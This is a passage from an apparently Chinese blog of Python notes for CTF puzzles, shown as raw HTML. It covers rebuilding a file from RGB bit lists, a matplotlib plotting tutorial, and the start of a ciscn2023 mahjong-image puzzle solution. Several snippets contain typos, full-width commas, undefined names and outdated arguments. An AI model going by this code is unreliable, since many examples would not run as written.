class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(r_list), <span class="hljs-number">8</span>):    <br>    out.write(<span class="hljs-built_in">int</span>(r_list[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>).to_bytes(length=<span class="hljs-number">1</span>,byteorder=<span class="hljs-string">&#x27;big&#x27;</span>))<br>    out.write(<span class="hljs-built_in">int</span>(g_list[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>).to_bytes(length=<span class="hljs-number">1</span>,byteorder=<span class="hljs-string">&#x27;big&#x27;</span>))    <br>    out.write(<span class="hljs-built_in">int</span>(b_list[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>).to_bytes(length=<span class="hljs-number">1</span>,byteorder=<span class="hljs-string">&#x27;big&#x27;</span>))<br>   <br>out.close()<br>r.close()<br>g.close()<br>b.close()<br></code></pre></td></tr></table></figure><p>删去END后面的内容即可得到flag</p><h3 id="Matplotlib-Pyplot"><a href="#Matplotlib-Pyplot" class="headerlink" title="Matplotlib Pyplot"></a>Matplotlib Pyplot</h3><p>Pyplot 是matplotlib的子库。</p><p>Pyplot 包含一系列绘图函数的相关函数，每个函数会对当前的图像进行一些修改，例如：给图像加上标记，生新的图像，在图像中产生新的绘图区域等等。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br></code></pre></td></tr></table></figure><p>引入pyplot库 ，设置别名为plt。</p><ul><li><code>plot()</code>：用于绘制线图和散点图</li><li><code>scatter()</code>：用于绘制散点图</li><li><code>bar()</code>：用于绘制垂直条形图和水平条形图</li><li><code>hist()</code>：用于绘制直方图</li><li><code>pie()</code>：用于绘制饼图</li><li><code>imshow()</code>：用于绘制图像</li><li><code>subplots()</code>：用于创建子图</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 画单条线</span><br>plot([x], y, [fmt], *, data=<span class="hljs-literal">None</span>, **kwargs)<br><span class="hljs-comment"># 画多条线</span><br>plot([x], y, [fmt], [x2], y2, [fmt2], ..., **kwargs)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">plot(x, y)     <span class="hljs-comment"># 创建 y 中数据与 x 中对应值的二维线图，使用默认样式</span><br>plot(x, y, <span class="hljs-string">&#x27;bo&#x27;</span>) <span class="hljs-comment"># 创建 y 中数据与 x 中对应值的二维线图，使用蓝色实心圈绘制</span><br>plot(y)      <span class="hljs-comment"># x 的值为 0..N-1</span><br>plot(y, <span class="hljs-string">&#x27;r+&#x27;</span>)   <span class="hljs-comment"># 使用红色 + 号</span><br></code></pre></td></tr></table></figure><p><strong>颜色字符：</strong>‘b’ 蓝色，’m’ 洋红色，’g’ 绿色，’y’ 黄色，’r’ 红色，’k’ 黑色，’w’ 白色，’c’ 青绿色，’#008000’ RGB 颜色符串。多条曲线不指定颜色时，会自动选择不同颜色。</p><p><strong>线型参数：</strong>‘‐’ 实线，’‐‐’ 破折线，’‐.’ 点划线，’:’ 虚线。</p><p><strong>标记字符：</strong>‘.’ 点标记，’,’ 像素标记(极小点)，’o’ 实心圈标记，’v’ 倒三角标记，’^’ 上三角标记，’&gt;’ 右三角标记，’&lt;’ 左三角标记…等等。</p><p>绘制直线时</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np <span class="hljs-comment"># 引入多维数组</span><br>x=np.array([<span class="hljs-number">0</span>,<span class="hljs-number">6</span>])<br>y=np.array([<span class="hljs-number">0</span>,<span class="hljs-number">100</span>])<br>plt.plot(x,y)<br>plt.show<br></code></pre></td></tr></table></figure><p>只想绘制两个点</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np <span class="hljs-comment"># 引入多维数组</span><br>x=np.array([<span class="hljs-number">0</span>,<span class="hljs-number">6</span>])<br>y=np.array([<span class="hljs-number">0</span>,<span class="hljs-number">100</span>])<br>plt.plot(x,y，<span class="hljs-string">&#x27;o&#x27;</span>)<br>plt.show<br></code></pre></td></tr></table></figure><p>如果不指定x的值，那么将会根据y的值来设置</p><p>我们可以使用 pyplot 中的 grid() 方法来设置图表中的网格线。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">matplotlib.pyplot.grid(b=<span class="hljs-literal">None</span>, which=<span class="hljs-string">&#x27;major&#x27;</span>, axis=<span class="hljs-string">&#x27;both&#x27;</span>, )<br>//b：可选，默认为 <span class="hljs-literal">None</span>，可以设置布尔值，true 为显示网格线，false 为不显示，如果设置 kwargs 参数，则值为 true。<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text">标题和轴标签<br><br>        设置图片标题：<br><br>plt.title(&quot;标题&quot;, fontsize=12, loc=&quot;center&quot;)//loc:left, right, center<br>        设置轴标签：<br><br>plt.xlabel(&quot;x轴标题&quot;, fontsize=12, loc=&quot;left&quot;)//loc: left, right, center<br>plt.ylabel(&quot;y轴标题&quot;, fontsize=12, loc=&quot;top&quot;)//loc: top, bottom, center<br><br><br>设置横坐标轴刻度范围：plt.xticks(ticks, labels, rotation=90, fontsize=12)<br>设置纵坐标轴刻度范围：plt.yticks(ticks, labels, rotation=90, fontsize=12)<br></code></pre></td></tr></table></figure><h4 id="绘制多图"><a href="#绘制多图" class="headerlink" title="绘制多图"></a>绘制多图</h4><p><strong>subplot()</strong> 方法在绘图时需要指定位置，<strong>subplots()</strong> 方法可以一次生成多个，在调用时只需要调用生成对象的 ax 即可。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment">#plot 1:</span><br>xpoints = np.array([<span class="hljs-number">0</span>, <span class="hljs-number">6</span>])<br>ypoints = np.array([<span class="hljs-number">0</span>, <span class="hljs-number">100</span>])<br><br>plt.subplot(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)<br>plt.plot(xpoints,ypoints)<br>plt.title(<span class="hljs-string">&quot;plot 1&quot;</span>)<br><br><span class="hljs-comment">#plot 2:</span><br>x = np.array([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>])<br>y = np.array([<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>])<br><br>plt.subplot(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>)<br>plt.plot(x,y)<br>plt.title(<span class="hljs-string">&quot;plot 2&quot;</span>)<br><br>plt.suptitle(<span class="hljs-string">&quot;RUNOOB subplot Test&quot;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p>subplots()</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">matplotlib.pyplot.subplots(nrows=<span class="hljs-number">1</span>, ncols=<span class="hljs-number">1</span>, *, sharex=<span class="hljs-literal">False</span>, sharey=<span class="hljs-literal">False</span>, squeeze=<span class="hljs-literal">True</span>, subplot_kw=<span class="hljs-literal">None</span>, gridspec_kw=<span class="hljs-literal">None</span>, fig_kw)<br></code></pre></td></tr></table></figure><ul><li><strong>nrows</strong>：默认为 1，设置图表的行数。</li><li><strong>ncols</strong>：默认为 1，设置图表的列数。</li><li><strong>sharex、sharey</strong>：设置 x、y 轴是否共享属性，默认为 false，可设置为 ‘none’、’all’、’row’ 或 ‘col’。 False 或 none 每个子图的 x 轴或 y 轴都是独立的，True 或 ‘all’：所有子图共享 x 轴或 y 轴，’row’ 设置每个子图行共享一个 x 轴或 y 轴，’col’：设置每个子图列共享一个 x 轴或 y 轴。</li><li><strong>squeeze</strong>：布尔值，默认为 True，表示额外的维度从返回的 Axes(轴)对象中挤出，对于 N<em>1 或 1</em>N 个子图，返回一个 1 维数组，对于 N*M，N&gt;1 和 M&gt;1 返回一个 2 维数组。如果设置为 False，则不进行挤压操作，返回一个元素为 Axes 实例的2维数组，即使它最终是1x1。</li><li><strong>subplot_kw</strong>：可选，字典类型。把字典的关键字传递给 add_subplot() 来创建每个子图。</li><li><strong>gridspec_kw</strong>：可选，字典类型。把字典的关键字传递给 GridSpec 构造函数创建子图放在网格里(grid)。</li><li>*<strong>*fig_kw</strong>：把详细的关键字参数传给 figure() 函数。</li></ul><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">import matplotlib.pyplot as plt<br>import numpy as np<br><span class="hljs-comment"># 创建一个2x2的子图</span><br>fig, axs = plt.subplots<span class="hljs-params">(<span class="hljs-attr">nrows</span>=2, <span class="hljs-attr">ncols</span>=2)</span><br> <br><span class="hljs-comment"># 在第一个子图中绘制正弦函数</span><br>x = np.linspace<span class="hljs-params">(0, 10, 100)</span><br>y1 = np.sin<span class="hljs-params">(x)</span><br>axs[0, 0]<span class="hljs-string">.plot</span><span class="hljs-params">(x, y1)</span><br>axs[0, 0]<span class="hljs-string">.set_title</span><span class="hljs-params">(&#x27;Sin(x)</span>&#x27;)<br> <br><span class="hljs-comment"># 在第二个子图中绘制余弦函数</span><br>y2 = np.cos<span class="hljs-params">(x)</span><br>axs[0, 1]<span class="hljs-string">.plot</span><span class="hljs-params">(x, y2)</span><br>axs[0, 1]<span class="hljs-string">.set_title</span><span class="hljs-params">(&#x27;Cos(x)</span>&#x27;)<br> <br><span class="hljs-comment"># 在第三个子图中绘制正切函数</span><br>y3 = np.tan<span class="hljs-params">(x)</span><br>axs[1, 0]<span class="hljs-string">.plot</span><span class="hljs-params">(x, y3)</span><br>axs[1, 0]<span class="hljs-string">.set_title</span><span class="hljs-params">(&#x27;Tan(x)</span>&#x27;)<br> <br><span class="hljs-comment"># 在第四个子图中绘制正切函数的导数</span><br>y4 = 1 / np.cos<span class="hljs-params">(x)</span> ** 2<br>axs[1, 1]<span class="hljs-string">.plot</span><span class="hljs-params">(x, y4)</span><br>axs[1, 1]<span class="hljs-string">.set_title</span><span class="hljs-params">(&#x27;Tan\&#x27;(x)</span>&#x27;)<br><span class="hljs-comment"># 调整布局以及子图之间的间距</span><br>plt.tight_layout<span class="hljs-params">()</span><br><span class="hljs-comment"># 显示图形</span><br>plt.show<span class="hljs-params">()</span><br><span class="hljs-string">//</span><br>第 8~13 行在第一个子图 axs[0,0] 中绘制正弦函数，同时设置了标题为 ‘Sin<span class="hljs-params">(x)</span>’。<br><br>第 16~21 行在第二个子图 axs[0,1] 中绘制余弦函数，同时设置了标题为 ‘Cos<span class="hljs-params">(x)</span>’。<br><br>第 24~29 行在第三个子图 axs[1,0] 中绘制正切函数，同时设置了标题为 ‘Tan<span class="hljs-params">(x)</span>’。<br><br>第 32~37 行在第四个子图 axs[1,1] 中绘制正切函数的导数，同时设置了标题为 ‘Tan’<span class="hljs-params">(x)</span>&#x27;。<br></code></pre></td></tr></table></figure><h4 id="散点图"><a href="#散点图" class="headerlink" title="散点图"></a>散点图</h4><p>可以用plot或scatter</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>height=[<span class="hljs-number">160</span>,<span class="hljs-number">170</span>,<span class="hljs-number">175</span>,<span class="hljs-number">186</span>]<br>weight=[<span class="hljs-number">49</span>,<span class="hljs-number">50</span>,<span class="hljs-number">55</span>,<span class="hljs-number">58</span>]<br>plt.scatter(heigth,weight)   <span class="hljs-comment">#将x和y的数据变成列表</span><br>plt.show()<br></code></pre></td></tr></table></figure><h4 id="折线图"><a href="#折线图" class="headerlink" title="折线图"></a>折线图</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>x=np.linspace(-<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">100</span>) <span class="hljs-comment">#从-10到10，等区间分成100份</span><br>y=x**<span class="hljs-number">2</span><br>plt.plot(x,y)<br>plt.show()<br><br><br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np <br>x=np.array([<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>])<br>y=np.array([<span class="hljs-number">0</span>,<span class="hljs-number">100</span>,<span class="hljs-number">12</span>,<span class="hljs-number">2</span>])<br>plt.plot(x,y)<br>plt.show()<br></code></pre></td></tr></table></figure><h4 id="条形图"><a href="#条形图" class="headerlink" title="条形图"></a>条形图</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br><span class="hljs-comment">#------绘制单变量条形图------</span><br>n=<span class="hljs-number">5</span><br>y=[<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>，<span class="hljs-number">60</span>]<br>index=np.arrage(n)<br>pl=plt.bar(left=index,height=y,color=<span class="hljs-string">&#x27;red&#x27;</span>,width=<span class="hljs-number">0.5</span>)  <span class="hljs-comment">#left表示横坐标从0到5，高度为y，颜色为红色，宽度为0.5</span><br>pl=plt.bar(left=<span class="hljs-number">0</span>,bottow=index,width=y,color=<span class="hljs-string">&#x27;red&#x27;</span>,height=<span class="hljs-number">0.5</span>,orientation=<span class="hljs-string">&#x27;horizontal&#x27;</span>)  <span class="hljs-comment">#left表示横坐标，bottow表示纵坐标，width表示宽度，颜色为红色，高度为0.5，方向为水平方向</span><br>plt.show()<br><br><span class="hljs-comment">#多变量条形图</span><br>sales_BJ=[<span class="hljs-number">50</span>,<span class="hljs-number">55</span>,<span class="hljs-number">63</span>,<span class="hljs-number">69</span>]<br>sales_SH=[<span class="hljs-number">45</span>,<span class="hljs-number">56</span>,<span class="hljs-number">58</span>,<span class="hljs-number">66</span>]<br><br><span class="hljs-comment">#绘制并列式的条形图</span><br>plt.bar(left=index,height=sales_BJ,colors=<span class="hljs-string">&#x27;red&#x27;</span>)<br>plt.bar(left=index+barwidth,height=sales_SH,colors=<span class="hljs-string">&#x27;blue&#x27;</span>)  <br>plt.show()<br><br><br></code></pre></td></tr></table></figure><h4 id="直方图"><a href="#直方图" class="headerlink" title="直方图"></a>直方图</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br><span class="hljs-comment">#-------绘制单变量直方图-------</span><br>x=<span class="hljs-number">100</span>+no.random.randon(<span class="hljs-number">2000</span>)  <span class="hljs-comment">#x是2000个以100为均值的随机数据</span><br>plt.hist(x,bins=<span class="hljs-number">10</span>，normed=<span class="hljs-literal">True</span>)   <span class="hljs-comment">#bins表示共有10个直方块,normed表示是否需要标准化数据</span><br>plt.show()<br><br><span class="hljs-comment">#-------绘制双变量直方图-------</span><br>x=np.random.randon(<span class="hljs-number">2000</span>)+<span class="hljs-number">2</span><br>y=np.random.randon(<span class="hljs-number">2000</span>)+<span class="hljs-number">3</span><br>plt.hist2d(x,y,bins=<span class="hljs-number">40</span>)   <span class="hljs-comment">#用颜色深浅表示频率的大小</span><br>plt.show()<br><br><br></code></pre></td></tr></table></figure><h4 id="饼状图"><a href="#饼状图" class="headerlink" title="饼状图"></a>饼状图</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>labels=<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span><br>fracs=[<span class="hljs-number">15</span>,<span class="hljs-number">30</span>,<span class="hljs-number">45</span>,<span class="hljs-number">10</span>]<br>explode=[<span class="hljs-number">0</span>,<span class="hljs-number">0.05</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]   <span class="hljs-comment">#标签为B的饼块将会离开圆心0.05个距离单位</span><br>plt.axes(aspect=<span class="hljs-number">1</span>)   <span class="hljs-comment">#绘制正圆</span><br>plt.pie(x=fracs,labels=labels,autopct=<span class="hljs-string">&#x27;%.0f%%&#x27;</span>,explode=explode,shadow=<span class="hljs-literal">True</span>)  <span class="hljs-comment">#autopct表示数据将会精确到小数点后一位，expolde表示希望着重表示哪一块，shadow表示是否需要添加阴影显得更好看</span><br>plt.show()<br><br><br></code></pre></td></tr></table></figure><h4 id="imshow（）"><a href="#imshow（）" class="headerlink" title="imshow（）"></a>imshow（）</h4><p>imshow() 函数是 Matplotlib 库中的一个函数，用于显示图像。</p><p>imshow() 函数常用于绘制二维的灰度图像或彩色图像。</p><p>imshow() 函数可用于绘制矩阵、热力图、地图等。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">imshow(X, cmap=<span class="hljs-literal">None</span>, norm=<span class="hljs-literal">None</span>, aspect=<span class="hljs-literal">None</span>, interpolation=<span class="hljs-literal">None</span>, alpha=<span class="hljs-literal">None</span>, vmin=<span class="hljs-literal">None</span>, vmax=<span class="hljs-literal">None</span>, origin=<span class="hljs-literal">None</span>, extent=<span class="hljs-literal">None</span>, shape=<span class="hljs-literal">None</span>, filternorm=<span class="hljs-number">1</span>, filterrad=<span class="hljs-number">4.0</span>, imlim=<span class="hljs-literal">None</span>, resample=<span class="hljs-literal">None</span>, url=<span class="hljs-literal">None</span>, *, data=<span class="hljs-literal">None</span>, kwargs)<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">绘画矩阵<br>x = <span class="hljs-selector-attr">[[1,2]</span>,<span class="hljs-selector-attr">[3,4]</span>]<br>plt<span class="hljs-selector-class">.imshow</span>(x, cmap=plt<span class="hljs-selector-class">.cm</span><span class="hljs-selector-class">.gray</span>, alpha=<span class="hljs-number">0.5</span>)<br>plt<span class="hljs-selector-class">.text</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;TP&quot;</span>)<br>plt<span class="hljs-selector-class">.text</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;FP&quot;</span>)<br>plt<span class="hljs-selector-class">.text</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;FN&quot;</span>)<br>plt<span class="hljs-selector-class">.text</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;TN&quot;</span>)<br>plt<span class="hljs-selector-class">.xlabel</span>(<span class="hljs-string">&quot;prediction&quot;</span>)<br>plt<span class="hljs-selector-class">.ylabel</span>(<span class="hljs-string">&quot;label&quot;</span>)<br>plt<span class="hljs-selector-class">.xticks</span>(<span class="hljs-selector-attr">[0, 1]</span>, <span class="hljs-selector-attr">[<span class="hljs-string">&quot;true&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>]</span>)<br>plt<span class="hljs-selector-class">.yticks</span>(<span class="hljs-selector-attr">[0, 1]</span>, <span class="hljs-selector-attr">[<span class="hljs-string">&quot;true&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>]</span>)<br><span class="hljs-comment">//生成与x的形状相同的方块矩阵，与x的内部值没关系，只与其形状有关系</span><br><span class="hljs-comment">//alpha设置透明度</span><br></code></pre></td></tr></table></figure><h4 id="imread"><a href="#imread" class="headerlink" title="imread"></a>imread</h4><p>imread() 方法是 Matplotlib 库中的一个函数，用于从图像文件中读取图像数据。可以裁剪图像，也可以改变图像的颜色。</p><p>imread() 方法返回一个 numpy.ndarray 对象，其形状是 **(nrows, ncols, nchannels)**，表示读取的图像的行数、列数和通道数：</p><ul><li>如果图像是灰度图像，则 nchannels 为 1。</li><li>如果是彩色图像，则 nchannels 为 3 或 4，分别表示红、绿、蓝三个颜色通道和一个 alpha 通道。</li></ul><p>imread() 方法的语法如下：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fortran">matplotlib.pyplot.imread(fname, <span class="hljs-keyword">format</span>=<span class="hljs-keyword">None</span>)<br>fname：指定了要读取的图像文件的文件名或文件路径，可以是相对路径或绝对路径。<br><span class="hljs-keyword">format</span> ：参数指定了图像文件的格式，如果不指定，则默认根据文件后缀名来自动识别格式。<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br><span class="hljs-comment"># 读取图像文件，下载地址：</span><br>img = plt.imread(<span class="hljs-string">&#x27;map.jpeg&#x27;</span>)<br><br><span class="hljs-comment"># 显示图像</span><br>plt.imshow(img)<br>plt.show()<br></code></pre></td></tr></table></figure><h4 id="ciscn2023的国粹"><a href="#ciscn2023的国粹" class="headerlink" title="ciscn2023的国粹"></a>ciscn2023的国粹</h4><p>根据第一张麻将的图片进行从1开始标记，然后以a.png为横坐标，另一个为纵坐标。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br>x = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">9</span>,<span class="hljs-number">9</span>,<span class="hljs-number">9</span>,<span 